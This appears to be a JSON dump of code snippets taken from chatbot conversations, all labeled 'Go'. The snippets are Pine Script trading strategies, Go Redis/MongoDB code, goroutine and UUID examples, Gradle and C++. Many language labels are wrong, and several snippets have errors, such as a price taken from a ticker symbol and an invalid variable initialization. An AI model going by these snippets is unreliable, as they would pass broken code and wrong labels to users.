strategy.exit(\"Take Profit\", \"Buy\", limit=take_profit, qty=qty, comment=\"Take Profit 20%\")\n    strategy.exit(\"Trailing Stop\", \"Buy\", trail_points=trailing_stop, qty=qty, comment=\"Take Profit 40%\")\n    \nif short_signal\n    if bar_index > 0\n        strategy.cancel_all()\n        strategy.entry(\"Sell\", strategy.short, qty=qty, comment=\"Sell\")\n        \n        entry_price := syminfo.ticker\n        stop_loss := entry_price + stop_loss\n        take_profit := entry_price - take_profit\n        trailing_stop := take_profit * 1.2\n        \n    strategy.exit(\"Stop Loss\", \"Sell\", stop=stop_loss, qty=qty, limit=entry_price, comment=\"Stop Loss\")\n    strategy.exit(\"Take Profit\", \"Sell\", limit=take_profit, qty=qty, comment=\"Take Profit 20%\")\n    strategy.exit(\"Trailing Stop\", \"Sell\", trail_points=trailing_stop, qty=qty, comment=\"Take Profit 40%\")\n\n// Display trades\nplotchar(strategy.position_size > 0, text=\"Buy\", char='B', location=location.top, color=color.green, transp=0, offset=-2)\nplotchar(strategy.position_size < 0, text=\"Sell\", char='S', location=location.top, color=color.red, transp=0, offset=-2)",
    "filename": "f140f3eca606b060b7e3c07830a566f5_0.go"
  },
  {
    "conversation_hash": "f140f3eca606b060b7e3c07830a566f5",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(title=\"Example Strategy\", overlay=true)\n\n// Define inputs \nqty = input.float(title=\"Trade Size\", defval=1.0, minval=0.1, maxval=10, step=0.1)\nstop_loss_percent = input.float(title=\"Stop Loss Percentage\", defval=0.20, minval=0.01, maxval=0.50, step=0.01)\ntake_profit_percent = input.float(title=\"Take Profit Percentage\", defval=0.20, minval=0.01, maxval=0.50, step=0.01)\n\n// Define variables\nlong_entry_price = 0.0\nlong_stop_loss = 0.0\nlong_take_profit = 0.0\nlong_trailing_stop = 0.0\n\nshort_entry_price = 0.0\nshort_stop_loss = 0.0\nshort_take_profit = 0.0\nshort_trailing_stop = 0.0\n\n// Define long and short conditions\nlong_condition = ta.crossover(ta.ema(close, 20), ta.ema(close, 50))\nshort_condition = ta.crossunder(ta.ema(close, 20), ta.ema(close, 50))\n\n// Long orders\nif long_condition\n    if strategy.opentrades == 0\n        long_entry_price := close\n        long_stop_loss := close - (stop_loss_percent * long_entry_price)\n        long_take_profit := close + (take_profit_percent * long_entry_price)\n        long_trailing_stop := long_take_profit\n    \n        strategy.entry(\"Long\", strategy.long, qty=qty, limit=long_entry_price)\n    elif strategy.opentrades > 0\n        current_price := high\n        \n        if current_price >= long_take_profit\n            if long_trailing_stop == long_take_profit\n                long_trailing_stop := long_take_profit + (take_profit_percent * long_entry_price)\n                long_stop_loss := long_entry_price\n            \n            elif long_trailing_stop != long_take_profit\n                long_trailing_stop := long_take_profit + (take_profit_percent * long_entry_price)\n                long_stop_loss := long_take_profit\n        \n        elif current_price < long_take_profit and current_price >= long_trailing_stop\n            long_stop_loss := long_trailing_stop\n            \n        elif current_price < long_trailing_stop and current_price >= long_entry_price\n            long_trailing_stop := long_entry_price + (take_profit_percent * long_entry_price)\n            long_stop_loss := long_entry_price\n        \n        strategy.exit(\"Take Profit\", \"Long\", limit=long_take_profit)\n        strategy.exit(\"Trailing Stop\", \"Long\", trail_points=long_trailing_stop-long_entry_price)\n        strategy.exit(\"Stop Loss\", \"Long\", stop=long_stop_loss)\n\n// Short orders\nif short_condition\n    if strategy.opentrades == 0\n        short_entry_price := close\n        short_stop_loss := close + (stop_loss_percent * short_entry_price)\n        short_take_profit := close - (take_profit_percent * short_entry_price)\n        short_trailing_stop := short_take_profit\n    \n        strategy.entry(\"Short\", strategy.short, qty=qty, limit=short_entry_price)\n    elif strategy.opentrades > 0\n        current_price := low\n        \n        if current_price <= short_take_profit\n            if short_trailing_stop == short_take_profit\n                short_trailing_stop := short_take_profit - (take_profit_percent * short_entry_price)\n                short_stop_loss := short_entry_price\n            \n            elif short_trailing_stop != short_take_profit\n                short_trailing_stop := short_take_profit - (take_profit_percent * short_entry_price)\n                short_stop_loss := short_take_profit\n        \n        elif current_price > short_take_profit and current_price <= short_trailing_stop\n            short_stop_loss := short_trailing_stop\n            \n        elif current_price > short_trailing_stop and current_price <= short_entry_price\n            short_trailing_stop := short_entry_price - (take_profit_percent * short_entry_price)\n            short_stop_loss := short_entry_price\n        \n        strategy.exit(\"Take Profit\", \"Short\", limit=short_take_profit)\n        strategy.exit(\"Trailing Stop\", \"Short\", trail_points=short_entry_price-short_trailing_stop)\n        strategy.exit(\"Stop Loss\", \"Short\", stop=short_stop_loss)\n\n// Display trades\nif strategy.position_size > 0\n    plot(char=\"Buy\", text=\"Long\\nEntry Price: \" + str.tostring(long_entry_price) + \"\\nStop Loss: \" + str.tostring(long_stop_loss), location=location.absolute, color=color.green, transp=0)\nif strategy.position_size < 0\n    plot(char=\"Sell\", text=\"Short\\nEntry Price: \" + str.tostring(short_entry_price) + \"\\nStop Loss: \" + str.tostring(short_stop_loss), location=location.absolute, color=color.red, transp=0)",
    "filename": "f140f3eca606b060b7e3c07830a566f5_1.go"
  },
  {
    "conversation_hash": "f61f4034c2a47a080baf7428b0a3a298",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Trailing Stop Loss Example\")\n\ntradeSize = input.float(title='Trade Size',  defval=0.2, minval=0.01, step = 0.01)\n\n// Define the trailing stop loss percentage\ntrailingStop = input.int(title=\"Trailing Stop Percentage\", defval=5, minval=1, maxval=100)\n\n// Define long and short conditions\nlongCondition = (ipush==fib1)\nshortCondition = (ipush==fib0)\n\n// Enter long trade when long condition is met\nif (longCondition)\n    strategy.entry(\"Long Entry\", strategy.long, qty=tradeSize)\n\n// Enter short trade when short condition is met\nif (shortCondition)\n    strategy.entry(\"Short Entry\", strategy.short, qty=tradeSize)\n\n// Define trailing stop loss\nfloat trailPrice = na\nfloat stopLossPrice = na\nif (strategy.position_size > 0)  // Long position\n    if (trailPrice == na)\n        trailPrice := low\n    if (low < trailPrice)\n        trailPrice := low\n    trigger_price = trailPrice * (1 - trailingStop / 100)\n    if (stopLossPrice == na)\n        stopLossPrice := trigger_price\n    if (close < stopLossPrice)\n        strategy.exit(\"Trailing Stop\", \"Long\", stop = trigger_price)\n\nif (strategy.position_size < 0)  // Short position\n    if (trailPrice == na)\n        trailPrice := high\n    if (high > trailPrice)\n        trailPrice := high\n    trigger_price = trailPrice * (1 + trailingStop / 100)\n    if (stopLossPrice == na)\n        stopLossPrice := trigger_price\n    if (close > stopLossPrice)\n        strategy.exit(\"Trailing Stop\", \"Short\", stop = trigger_price)\n\nplot(stopLossPrice, color=color.red, title=\"Stop Loss Price\")",
    "filename": "f61f4034c2a47a080baf7428b0a3a298_1.go"
  },
  {
    "conversation_hash": "b9656dd63d1fd1368bcf5463e19ae904",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/sbinet/go-python\"\n    \"os\"\n)\n\nfunc main() {\n    // Инициализация Python интерпретатора\n    err := python.Initialize()\n    if err != nil {\n        panic(err)\n    }\n    defer python.Finalize()\n\n    // Экспорт Python-пакета yolov5_detect\n    detectModule := python.PyImport_ImportModule(\"yolov5_detect\")\n    if detectModule == nil {\n        fmt.Println(\"Ошибка импорта модуля\")\n        os.Exit(1)\n    }\n\n    // Получить функцию \"detect\" из модуля\n    detectFunc := detectModule.GetAttrString(\"detect\")\n    if detectFunc == nil {\n        fmt.Println(\"Ошибка получения функции detect\")\n        os.Exit(1)\n    }\n\n    // Путь к изображению для детектирования\n    image_path := \"path/to/image.jpg\"\n\n    // Вызов функции detect из Golang\n    argTuple := python.PyTuple_New(1)\n    python.PyTuple_SetItem(argTuple, 0, python.PyString_FromString(image_path))\n    result := detectFunc.Call(argTuple, nil)\n\n    // Обработка результата детектирования\n    resultList := python.PyList_AsSlice(result)\n    for _, item := range resultList {\n        detection := python.PyList_AsSlice(item)\n        fmt.Println(\"Класс:\", int(detection[5]))\n        fmt.Println(\"Вероятность:\", float64(python.PyFloat_AsDouble(detection[4])))\n        fmt.Printf(\"Координаты: x1=%f, y1=%f, x2=%f, y2=%f\\n\", detection[0], detection[1], detection[2], detection[3])\n\n    }\n\n}",
    "filename": "b9656dd63d1fd1368bcf5463e19ae904_9.go"
  },
  {
    "conversation_hash": "0f58e434c9f8decb0512e2b0f8947124",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"My Strategy\", overlay=true)\n\n// Set input for quantity\nqty = input(1, title=\"Quantity\")\n\n// Set condition for long signal\nlongSignal = // Your long condition here\n\n// Set condition for short signal\nshortSignal = // Your short condition here\n\n// Set stop loss and take profit for long deal\nlongSL = close * 0.8\nlongTP = close * 1.2\n\n// Set stop loss and take profit for short deal\nshortSL = close * 1.2\nshortTP = close * 0.8\n\n// Check for long signal and place entry order\nif (longSignal)\n    strategy.entry(\"Long\", strategy.long, qty, when=longSignal)\n\n    // Set stop loss and take profit for long deal\n    strategy.exit(\"Long\", stop=longSL, limit=longTP)\n\n// Check for short signal and place entry order\nif (shortSignal)\n    strategy.entry(\"Short\", strategy.short, qty, when=shortSignal)\n\n    // Set stop loss and take profit for short deal\n    strategy.exit(\"Short\", stop=shortSL, limit=shortTP)",
    "filename": "0f58e434c9f8decb0512e2b0f8947124_0.go"
  },
  {
    "conversation_hash": "be63f7cbbea54170c3220426b234f2a8",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:<version>'\n    }\n}",
    "filename": "be63f7cbbea54170c3220426b234f2a8_1.go"
  },
  {
    "conversation_hash": "bfd6298b1280146cdac7688282ab1e90",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\nfunc main() {\n\twg := &sync.WaitGroup{}\n\tch := make(chan string)\n\n\t// 启动 3 个 Goroutine 来处理任务\n\tfor i := 0; i < 3; i++ {\n\t\twg.Add(1)\n\t\tgo func(id int, ch chan string, wg *sync.WaitGroup) {\n\t\t\tdefer wg.Done()\n\t\t\tmsg := fmt.Sprintf(\"Goroutine %d finished processing\", id)\n\t\t\tch <- msg\n\t\t}(i, ch, wg)\n\t}\n\n\t// 在单独的 Goroutine 中接收通道消息\n\tgo func(ch chan string) {\n\t\tfor msg := range ch {\n\t\t\tfmt.Println(msg)\n\t\t}\n\t}(ch)\n\n\twg.Wait()\n\tclose(ch)\n}",
    "filename": "bfd6298b1280146cdac7688282ab1e90_0.go"
  },
  {
    "conversation_hash": "e784e20962b95a7951190f07bb4854d3",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "void func(int&& x) {\n  // ...\n}\n\nint main() {\n  int x = 1;\n  func(move(x)); // 调用函数，将x转为右值引用\n  return 0;\n}",
    "filename": "e784e20962b95a7951190f07bb4854d3_9.go"
  },
  {
    "conversation_hash": "0136359cc7434bf534e4ad87896d3c15",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package repository\n\nimport (\n    \"fmt\"\n    \"time\"\n\n    \"github.com/go-redis/redis/v8\"\n)\n\ntype SegmentRepository interface {\n    Save(segment *Segment) error\n    GetBySessionAndRefNum(sessionID string, referenceNum int) ([]*Segment, error)\n}\n\ntype RedisSegmentRepository struct {\n    client *redis.Client\n}\n\nfunc NewRedisSegmentRepository(addr, password string, db int) (*RedisSegmentRepository, error) {\n    r := &RedisSegmentRepository{}\n\n    r.client = redis.NewClient(&redis.Options{\n        Addr:     addr,\n        Password: password,\n        DB:       db,\n    })\n\n    _, err := r.client.Ping(r.client.Context()).Result()\n    if err != nil {\n        return nil, fmt.Errorf(\"unable to connect to redis: %w\", err)\n    }\n\n    return r, nil\n}\n\nfunc (r *RedisSegmentRepository) Save(segment *Segment) error {\n    key := fmt.Sprintf(\"%s:%d\", segment.SessionID, segment.ReferenceNum)\n\n    err := r.client.Set(r.client.Context(), key, segment.Payload, segment.ValidityTime).Err()\n    if err != nil {\n        return fmt.Errorf(\"failed to save segment: %w\", err)\n    }\n\n    return nil\n}\n\nfunc (r *RedisSegmentRepository) GetBySessionAndRefNum(sessionID string, referenceNum int) ([]*Segment, error) {\n    key := fmt.Sprintf(\"%s:%d\", sessionID, referenceNum)\n\n    payload, err := r.client.Get(r.client.Context(), key).Bytes()\n    if err != nil {\n        return nil, fmt.Errorf(\"failed to retrieve segments: %w\", err)\n    }\n\n    segments := make([]*Segment, 0)\n    segments = append(segments, &Segment{\n        SessionID:     sessionID,\n        ReferenceNum:  referenceNum,\n        Payload:       payload,\n        ValidityTime:  time.Minute * 5, // example validity time\n    })\n\n    return segments, nil\n}\n\ntype Segment struct {\n    SessionID     string\n    ReferenceNum  int\n    Payload       []byte\n    ValidityTime  time.Duration // segment expiration\n}",
    "filename": "0136359cc7434bf534e4ad87896d3c15_0.go"
  },
  {
    "conversation_hash": "0136359cc7434bf534e4ad87896d3c15",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func (r *RedisSegmentRepository) GetBySessionAndRefNum(sessionID string, referenceNum int) ([]*Segment, error) {\n    key := fmt.Sprintf(\"%s:%d\", sessionID, referenceNum)\n\n    payload, err := r.client.Get(r.client.Context(), key).Bytes()\n    if err == redis.Nil {\n        // Key has expired, segment is considered expired\n        return nil, fmt.Errorf(\"segment with session %s and reference %d is expired\", sessionID, referenceNum)\n    }\n    if err != nil {\n        return nil, fmt.Errorf(\"failed to retrieve segments: %w\", err)\n    }\n\n    segments := make([]*Segment, 0)\n    segments = append(segments, &Segment{\n        SessionID:     sessionID,\n        ReferenceNum:  referenceNum,\n        Payload:       payload,\n        ValidityTime:  time.Minute * 5, // example validity time\n    })\n\n    return segments, nil\n}",
    "filename": "0136359cc7434bf534e4ad87896d3c15_1.go"
  },
  {
    "conversation_hash": "0136359cc7434bf534e4ad87896d3c15",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package repository\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/go-redis/redis/v8\"\n\t\"go.mongodb.org/mongo-driver/bson\"\n\t\"go.mongodb.org/mongo-driver/mongo\"\n\t\"go.mongodb.org/mongo-driver/mongo/options\"\n\t\"go.mongodb.org/mongo-driver/mongo/readpref\"\n)\n\ntype SegmentRepository interface {\n\tSave(segment *Segment) error\n\tGetBySessionAndRefNum(sessionID string, referenceNum int) ([]*Segment, error)\n\tSearchExpired() ([]*Segment, error)\n\tDeleteExpired(segment *Segment) error\n}\n\ntype RedisSegmentRepository struct {\n\tclient *redis.Client\n}\n\ntype MongoDBSegmentRepository struct {\n\tclient  *mongo.Client\n\tctx     context.Context\n\ttimeout time.Duration\n}\n\nfunc NewRedisSegmentRepository(addr, password string, db int) (*RedisSegmentRepository, error) {\n\tr := &RedisSegmentRepository{}\n\n\tr.client = redis.NewClient(&redis.Options{\n\t\tAddr:     addr,\n\t\tPassword: password,\n\t\tDB:       db,\n\t})\n\n\t_, err := r.client.Ping(context.Background()).Result()\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"unable to connect to redis: %w\", err)\n\t}\n\n\treturn r, nil\n}\n\nfunc NewMongoDBSegmentRepository(uri string, db string, connectTimeout time.Duration) (*MongoDBSegmentRepository, error) {\n\tm := &MongoDBSegmentRepository{\n\t\ttimeout: connectTimeout,\n\t}\n\n\tctx, cancel := context.WithTimeout(context.Background(), connectTimeout)\n\tdefer cancel()\n\n\tclient, err := mongo.Connect(ctx, options.Client().ApplyURI(uri))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tm.ctx = context.Background()\n\tm.client = client\n\n\tif err := m.Ping(); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn m, nil\n}\n\nfunc (m *MongoDBSegmentRepository) Ping() error {\n\tctx, cancel := context.WithTimeout(context.Background(), m.timeout)\n\tdefer cancel()\n\n\terr := m.client.Ping(ctx, readpref.Primary())\n\tif err != nil {\n\t\treturn fmt.Errorf(\"unable to connect to mongo: %w\", err)\n\t}\n\treturn nil\n}\n\nfunc (r *RedisSegmentRepository) Save(segment *Segment) error {\n\tkey := fmt.Sprintf(\"%s:%d\", segment.SessionID, segment.ReferenceNum)\n\n\terr := r.client.Set(r.client.Context(), key, segment.Payload, segment.ValidityTime).Err()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to save segment: %w\", err)\n\t}\n\n\treturn nil\n}\n\nfunc (r *RedisSegmentRepository) GetBySessionAndRefNum(sessionID string, referenceNum int) ([]*Segment, error) {\n\tkey := fmt.Sprintf(\"%s:%d\", sessionID, referenceNum)\n\n\tpayload, err := r.client.Get(r.client.Context(), key).Bytes()\n\tif err == redis.Nil {\n\t\t// Key has expired, segment is considered expired\n\t\tsegments, err := expiredSegmentRepository.SearchExpired()\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tfor _, segment := range segments {\n\t\t\tif segment.SessionID == sessionID && segment.ReferenceNum == referenceNum {\n\t\t\t\treturn []*Segment{segment}, nil\n\t\t\t}\n\t\t}\n\t\treturn nil, fmt.Errorf(\"segment with session %s and reference %d is not found\", sessionID, referenceNum)\n\t}\n\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"failed to retrieve segments: %w\", err)\n\t}\n\n\tsegments := make([]*Segment, 0)\n\tsegments = append(segments, &Segment{\n\t\tSessionID:    sessionID,\n\t\tReferenceNum: referenceNum,\n\t\tPayload:      payload,\n\t\tValidityTime: time.Minute * 5, // example validity time\n\t})\n\n\treturn segments, nil\n}\n\nfunc (m *MongoDBSegmentRepository) Save(segment *Segment) error {\n\tcollection := m.client.Database(\"segments\").Collection(\"segments\")\n\n\t_, err := collection.InsertOne(m.ctx, bson.M{\n\t\t\"sessionId\":    segment.SessionID,\n\t\t\"referenceNum\": segment.ReferenceNum,\n\t\t\"payload\":      segment.Payload,\n\t\t\"validityTime\": segment.ValidityTime,\n\t\t\"createdAt\":    time.Now(),\n\t})\n\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc (m *MongoDBSegmentRepository) SearchExpired() ([]*Segment, error) {\n\tcollection := m.client.Database(\"segments\").Collection(\"segments\")\n\n\tfilter := bson.M{\n\t\t\"$and\": []bson.M{\n\t\t\t{\"createdAt\": bson.M{\"$lte\": time.Now().Add(-segmentValidityTime)}},\n\t\t\t{\"processedAt\": bson.M{\"$eq\": nil}},\n\t\t},\n\t}\n\n\tresults, err := collection.Find(m.ctx, filter, options.Find().SetLimit(1000))\n\n\tif err == mongo.ErrNoDocuments {\n\t\treturn []*Segment{}, nil\n\t}\n\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsegments := []*Segment{}\n\tfor results.Next(m.ctx) {\n\t\tvar segment Segment\n\t\terr = results.Decode(&segment)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\tsegments = append(segments, &segment)\n\t}\n\n\treturn segments, nil\n}\n\nfunc (m *MongoDBSegmentRepository) DeleteExpired(segment *Segment) error {\n\tcollection := m.client.Database(\"segments\").Collection(\"segments\")\n\n\tfilter := bson.M{\n\t\t\"$and\": []bson.M{\n\t\t\t{\"sessionId\": bson.M{\"$eq\": segment.SessionID}},\n\t\t\t{\"referenceNum\": bson.M{\"$eq\": segment.ReferenceNum}},\n\t\t\t{\"createdAt\": bson.M{\"$lte\": time.Now().Add(-segmentValidityTime)}},\n\t\t\t{\"processedAt\": bson.M{\"$eq\": nil}},\n\t\t},\n\t}\n\n\tupdate := bson.M{\"$set\": bson.M{\"processedAt\": time.Now()}}\n\n\t_, err := collection.UpdateOne(m.ctx, filter, update)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\ntype Segment struct {\n\tSessionID    string\n\tReferenceNum int\n\tPayload      []byte\n\tValidityTime time.Duration\n}\n\nconst segmentValidityTime = 10 * time.Minute // example validity time\nvar expiredSegmentRepository = NewMongoDBSegmentRepository(\"mongodb://localhost:27017\", \"segments\", 2*time.Second)",
    "filename": "0136359cc7434bf534e4ad87896d3c15_2.go"
  },
  {
    "conversation_hash": "5c0cddbd19317e5e83a4fe0bdb8a9508",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/go-redis/redis/v8\"\n)\n\nfunc main() {\n\tctx := context.Background()\n\n\t// connect to Redis\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\", // no password set\n\t\tDB:       0,  // use default DB\n\t})\n\n\t// create a sample SMPP segment\n\tsmppSegment := \"Hello world!\"\n\n\t// set the SMPP segment in Redis with a TTL of 5 seconds\n\tkey := \"smpp-segment-123\"\n\terr := rdb.SetEX(ctx, key, smppSegment, 5*time.Second).Err()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// wait for the TTL to expire\n\ttime.Sleep(10 * time.Second)\n\n\t// check if the SMPP segment still exists in Redis\n\tval, err := rdb.Get(ctx, key).Result()\n\tif err == redis.Nil {\n\t\tfmt.Println(\"SMPP segment not found\")\n\t} else if err != nil {\n\t\tpanic(err)\n\t} else {\n\t\tfmt.Println(\"SMPP segment:\", val)\n\t}\n}",
    "filename": "5c0cddbd19317e5e83a4fe0bdb8a9508_0.go"
  },
  {
    "conversation_hash": "5c0cddbd19317e5e83a4fe0bdb8a9508",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "Redis"
    ],
    "code": "import (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/go-redis/redis/v8\"\n)\n\nfunc main() {\n\tctx := context.Background()\n\n\t// Connect to Redis\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\", // no password set\n\t\tDB:       0,  // use default DB\n\t})\n\n\t// Create a sample SMPP segment with a validity time of 30 seconds\n\tsmppSegment := \"Hello world!\"\n\tvalidityTime := 30 * time.Second\n\n\t// Save the SMPP segment in Redis Sorted Set with a TTL\n\tkey := \"smpp-segments\"\n\ttimestamp := time.Now().Unix() + int64(validityTime/time.Second)\n\terr := rdb.ZAddEX(ctx, key, &redis.Z{\n\t\tScore:  float64(timestamp),\n\t\tMember: smppSegment,\n\t}).Err()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Retrieve expired SMPP segments from Redis Sorted Set\n\texpiredSegments, err := rdb.ZRangeByScore(ctx, key, &redis.ZRangeBy{\n\t\tMin: \"-inf\",\n\t\tMax: fmt.Sprintf(\"%d\", time.Now().Unix()),\n\t}).Result()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Delete expired SMPP segments from Redis Sorted Set\n\tif len(expiredSegments) > 0 {\n\t\tdeletedCount, err := rdb.ZRem(ctx, key, expiredSegments...).Result()\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\tfmt.Printf(\"Deleted %d expired SMPP segments\\n\", deletedCount)\n\t}\n\n\t// Process expired SMPP segments...\n}",
    "filename": "5c0cddbd19317e5e83a4fe0bdb8a9508_1.go"
  },
  {
    "conversation_hash": "5c0cddbd19317e5e83a4fe0bdb8a9508",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/go-redis/redis/v8\"\n)\n\nfunc main() {\n\tctx := context.Background()\n\n\t// Connect to Redis\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\", // no password set\n\t\tDB:       0,  // use default DB\n\t})\n\n\t// Subscribe to Redis notifications for expired keys\n\tps := rdb.Subscribe(ctx, \"__keyevent@0__:expired\")\n\tdefer ps.Close()\n\n\t// Start a goroutine to handle the notifications\n\tgo func() {\n\t\tfor {\n\t\t\tmsg, err := ps.ReceiveMessage(ctx)\n\t\t\tif err != nil {\n\t\t\t\tpanic(err)\n\t\t\t}\n\t\t\t// The \"msg.Channel\" field will be \"__keyevent@0__:expired\"\n\t\t\t// and the \"msg.Payload\" field will be the expired key\n\t\t\tfmt.Printf(\"Expired key: %s\\n\", msg.Payload)\n\t\t\t// Process expired SMPP segments...\n\t\t}\n\t}()\n\n\t// Create a sample SMPP segment with a validity time of 30 seconds\n\tsmppSegment := \"Hello world!\"\n\tvalidityTime := 30 * time.Second\n\n\t// Save the SMPP segment in Redis with a TTL\n\tkey := \"smpp-segment-123\"\n\terr := rdb.SetEX(ctx, key, smppSegment, validityTime).Err()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Wait for SMPP segment to expire...\n\tselect {}\n}",
    "filename": "5c0cddbd19317e5e83a4fe0bdb8a9508_2.go"
  },
  {
    "conversation_hash": "5c0cddbd19317e5e83a4fe0bdb8a9508",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"context\"\n\t\"database/sql\"\n\t\"fmt\"\n\t\"time\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n\t\"github.com/go-redis/redis/v8\"\n)\n\nfunc main() {\n\tctx := context.Background()\n\n\t// Connect to MySQL\n\tdb, err := sql.Open(\"mysql\", \"user:password@tcp(localhost:3306)/sms_db\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer db.Close()\n\n\t// Connect to Redis\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\", // no password set\n\t\tDB:       0,  // use default DB\n\t})\n\n\t// Create a sample SMPP segment with a validity time of 30 seconds\n\tsmppSegment := \"Hello world!\"\n\tvalidityTime := 30 * time.Second\n\n\t// Save the SMPP segment in Redis with a TTL\n\tkey := \"smpp-segment-123\"\n\terr = rdb.SetEX(ctx, key, smppSegment, validityTime).Err()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Save the SMPP segment in MySQL with the same validity time\n\texpireAt := time.Now().Add(validityTime)\n\t_, err = db.ExecContext(ctx, \"INSERT INTO sms_segments (segment, expire_at) VALUES (?, ?)\", smppSegment, expireAt)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// Wait for SMPP segment to expire...\n\tselect {}\n}",
    "filename": "5c0cddbd19317e5e83a4fe0bdb8a9508_3.go"
  },
  {
    "conversation_hash": "a99944f3cff0fed1a6603e2b2fc01c09",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\n// Sum 计算整数列表的和。\nfunc Sum(numbers []int) int {\n\tsum := 0\n\tfor _, value := range numbers {\n\t\tsum += value\n\t}\n\treturn sum\n}\n\nfunc main() {\n\tnumbers := []int{1, 2, 3, 4, 5}\n\tfmt.Println(\"Sum is:\", Sum(numbers))\n}",
    "filename": "a99944f3cff0fed1a6603e2b2fc01c09_0.go"
  },
  {
    "conversation_hash": "a99944f3cff0fed1a6603e2b2fc01c09",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"testing\"\n\nfunc TestSum(t *testing.T) {\n    t.Run(\"Test case 1\", func(t *testing.T) {\n        numbers := []int{1, 2, 3, 4, 5}\n        got := Sum(numbers)\n        want := 15\n\n        if got != want {\n            t.Errorf(\"Got %d, but want %d\", got, want)\n        }\n    })\n    \n    t.Run(\"Test case 2\", func(t *testing.T) {\n        numbers := []int{-2, 0, 2}\n        got := Sum(numbers)\n        want := 0\n\n        if got != want {\n            t.Errorf(\"Got %d, but want %d\", got, want)\n        }\n    })\n}",
    "filename": "a99944f3cff0fed1a6603e2b2fc01c09_1.go"
  },
  {
    "conversation_hash": "6e997d95a197a095fcb2f99a650f9cd1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type MyObject struct {\n  UUID string\n  Field1 string\n  Field2 int\n}",
    "filename": "6e997d95a197a095fcb2f99a650f9cd1_0.go"
  },
  {
    "conversation_hash": "6e997d95a197a095fcb2f99a650f9cd1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import \"github.com/google/uuid\"\n\nfunc generateUUID() string {\n  return uuid.NewString()\n}",
    "filename": "6e997d95a197a095fcb2f99a650f9cd1_1.go"
  },
  {
    "conversation_hash": "6e997d95a197a095fcb2f99a650f9cd1",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import \"fmt\"\n\ntype Option func(*MyObject)\n\nfunc WithField1(value string) Option {\n  return func(o *MyObject) {\n    o.Field1 = value\n  }\n}\n\nfunc WithField2(value int) Option {\n  return func(o *MyObject) {\n    o.Field2 = value\n  }\n}\n\nfunc NewMyObject(opts ...Option) *MyObject {\n  obj := &MyObject{\n    UUID: generateUUID(),\n  }\n  \n  for _, opt := range opts {\n    opt(obj)\n  }\n  \n  return obj\n}",
    "filename": "6e997d95a197a095fcb2f99a650f9cd1_2.go"
  },
  {
    "conversation_hash": "6e997d95a197a095fcb2f99a650f9cd1",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "obj := NewMyObject(\n  WithField1(\"value\"),\n  WithField2(123),\n)\n\nfmt.Println(obj.UUID, obj.Field1, obj.Field2)",
    "filename": "6e997d95a197a095fcb2f99a650f9cd1_3.go"
  },
  {
    "conversation_hash": "2465203cf4ac38de0b64ae54299d6b9f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Latest Price\", overlay=true)\n\nlatestPrice = 0.0 // Initialize latest price variable\n\nif barstate.isrealtime\n    latestPrice := open // If current bar is still forming, use the open price\nelse\n    latestPrice := close // If current bar is complete, use the close price\n\nplot(latestPrice, color=color.green, linewidth=2)",
